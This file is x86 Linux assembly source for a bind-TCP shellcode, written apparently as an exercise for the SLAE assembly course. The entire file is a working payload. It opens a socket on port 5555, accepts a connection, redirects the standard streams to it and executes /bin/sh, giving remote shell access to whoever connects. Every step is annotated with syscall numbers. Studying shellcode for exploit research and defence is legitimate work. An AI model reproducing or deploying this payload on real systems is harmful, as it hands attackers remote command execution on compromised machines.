; Linux/x86 Shell Bind TCP assembly shellcode
; Author SLAE - 926 for SecurityTube Linux Assembly Expert course

global _start

section .text

_start:

; set port number
	mov bp, 0xB315 ; set port to 5555 in little endian format

; SOCKET
; int socket(int domain, int type, int protocol);

	xor eax, eax ; eax = 00000000
	push eax ; protocol IP = 00000000
	inc eax ; eax = 00000001
	push eax ; prepare to pop 00000001 to ebx
	pop ebx ; SYS_SOCKET = 00000001 (1) /usr/include/linux/net.h
	push eax ; SOCK_STREAM = 00000001 /usr/include/i386-linux-gnu/bits/socket.h
	push byte 0x2 ; AF_INET = 00000002 /usr/include/i386-linux-gnu/bits/socket.h
	
	mov al, 0x66 ; SYS_SOCKETCALL 102 = 0x66 /usr/include/i386-linux-gnu/asm/unistd_32.h
	mov ecx, esp ; set ecx to point to top of the stack SYS_SOCKET
	int 0x80 ; invoke socketcall SYS_SOCKET
	
	xchg esi, eax ; store file descriptor for socket in esi
	
; setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &socklen_t, socklen_t);
; setsockopt(sockfd, 1, 2, &socklen_t, 4);

	push byte 0x4 ; socklen_t push 00000004
	push esp ; address of socklen_t
	push byte 0x2 ; SO_REUSEADDR = 00000002
	push ebx ; SOL_SOCKET = 00000001
	push esi ; sockfd
	mov bl, 0xe ; SYS_SETSOCKOPT = 0000000e (14) /usr/include/linux/net.h
	
	mov al, 0x66 ; SYS_SOCKETCALL 102 = 0x66 /usr/include/i386-linux-gnu/asm/unistd_32.h
	mov ecx, esp ; set ecx to point to top of the stack SYS_SETSOCKOPT
	int 0x80 ; invoke socketcall SYS_SETSOCKOPT
	
; BIND
; int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);

	xor edx, edx ; edx = 00000000
	; struct sockaddr_in 
	push edx ; INADDR_ANY= 00000000 accept any IPv4 address /usr/include/netinet/in.h
	push bp
	;mov dx, bp ; port
	;push dx ; LISTENING port little endian 5555
	mov bl, 0x2 ; SYS_BIND = 00000002 (2) /usr/include/linux/net.h
	push bx ; AF_INET = 00000002 /usr/include/i386-linux-gnu/bits/socket.h
	mov ecx, esp ; pointer of struct sockaddr_in
	push byte 0x10 ; socklen_t addrlen (16) /usr/include/linux/in.h
	push ecx ; pointer to struct sockaddr
	push esi ; sockfd

	mov al, 0x66 ; SYS_SOCKETCALL 102 = 0x66 /usr/include/i386-linux-gnu/asm/unistd_32.h
	mov ecx, esp ; set ecx to point to top of the stack SYS_BIND
	int 0x80 ; invoke socketcall SYS_BIND
	
; LISTEN
; int listen(int sockfd, int backlog);
	push eax ; eax = 00000000 from SYS_BIND
	push esi ; sockfd
	mov bl, 0x4 ; SYS_LISTEN = 00000004 (4) /usr/include/linux/net.h
	
	mov al, 0x66 ; SYS_SOCKETCALL 102 = 0x66 /usr/include/i386-linux-gnu/asm/unistd_32.h
	mov ecx, esp ; set ecx to point to top of the stack SYS_LISTEN
	int 0x80 ; invoke socketcall SYS_LISTEN
	
; ACCEPT
; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);	
	
	inc ebx ; SYS_ACCEPT 00000005 (5) /usr/include/linux/net.h
	; all three arguments are already on the stack 
	; socklen_t *addrlen = 0
	; struct sockaddr *addr = 0
	; sockfd
	mov al, 0x66 ; SYS_SOCKETCALL 102 = 0x66 /usr/include/i386-linux-gnu/asm/unistd_32.h
	mov ecx, esp ; set ecx to point to top of the stack SYS_ACCEPT
	int 0x80 ; invoke socketcall SYS_ACCEPT
	
; DUP2
; int dup2(int oldfd, int newfd);

	xchg eax, ebx ; ebx = oldfd eax = 00000005
	xchg ecx, esi ; store 7 into ecx to save xor ecx, ecx mov cl, 0x3
	
loop:
	dec ecx ; ecx = 2 stderr, ecx = 1 stdout, ecx = 0 stdin
	mov al, 0x3f ; dup2 syscall 63 = 0x3f
	int 0x80 ; invoke dup2 syscall 
	
	jnz loop 

; EXECVE
; int execve(const char *filename, char *const argv[], char *const envp[]);
	xor eax, eax
;	push eax ; eax = 00000000
	push eax ; eax = 00000000
	push eax ; eax = 00000000
	pop ecx ; execve argv
	pop edx ; execve envp
	push eax
	push    0x68732f2f         ; "//sh"
	push    0x6e69622f         ; "/bin"
	
	mov al, 0xb ; EXECVE 11 = 0xb 
	;mov ecx, esp ; set ecx to point to top of the stack EXECVE
	xchg esp, ebx
	int 0x80 ; execve syscall

	
